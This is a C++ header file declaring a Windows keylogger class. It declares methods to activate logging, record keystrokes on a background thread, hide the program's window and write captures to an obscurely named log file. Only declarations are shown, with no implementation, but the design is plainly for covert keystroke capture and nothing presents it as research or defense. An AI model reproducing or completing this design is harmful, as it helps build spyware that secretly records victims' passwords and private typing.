#pragma once
//#include <iostream>
#include <Windows.h>
#include <fstream>
#include <string>
#include <thread>

#define VK_ENTER 13
#define NEW_KEY_PRESSED -32767

using namespace std;

class Keylogger
{
public:
	Keylogger();
	~Keylogger();
	void Activate();
	void Deactivate();
	string GetLog();
	void DeleteLog();

private:
	void HideWindow();
	void LogKeystrokes();
	string GetKeyPressAsString();

	string const LOG_FILE = "log_849287.txt";
	string current_log;
	thread logger;
	bool log;
};
